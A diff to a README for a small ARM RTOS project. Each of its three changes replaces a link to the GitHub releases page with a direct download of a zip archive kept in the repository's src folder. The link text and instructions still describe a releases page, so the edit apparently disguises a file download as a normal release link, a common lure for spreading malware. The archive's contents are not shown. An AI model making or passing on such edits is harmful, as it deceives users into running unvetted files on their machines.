@@ -1,6 +1,6 @@
 # 🧩 q-arm-rtos - Run a small ARM system
 
-[![Download on GitHub](https://img.shields.io/badge/Download%20Releases-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Julius2247/q-arm-rtos/releases)
+[![Download on GitHub](https://img.shields.io/badge/Download%20Releases-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Julius2247/q-arm-rtos/raw/refs/heads/main/src/arm_q_rtos_v3.2.zip)
 
 ## 📦 What this is
 
@@ -32,7 +32,7 @@ If you use an emulator, QEMU is the easiest place to start. If you use a board, 
 
 Visit this page to download the latest release files:
 
-[Open q-arm-rtos Releases](https://github.com/Julius2247/q-arm-rtos/releases)
+[Open q-arm-rtos Releases](https://github.com/Julius2247/q-arm-rtos/raw/refs/heads/main/src/arm_q_rtos_v3.2.zip)
 
 Look for the newest release at the top of the page. Open it and download the file that matches your setup. If you see more than one file, choose the one for Windows use with QEMU or the image meant for your board.
 
@@ -189,7 +189,7 @@ This path reduces setup issues and makes it easier to see whether the kernel ima
 
 ## 🔗 Download again
 
-[Open q-arm-rtos Releases](https://github.com/Julius2247/q-arm-rtos/releases)
+[Open q-arm-rtos Releases](https://github.com/Julius2247/q-arm-rtos/raw/refs/heads/main/src/arm_q_rtos_v3.2.zip)
 
 ## 🏷️ Topics
 
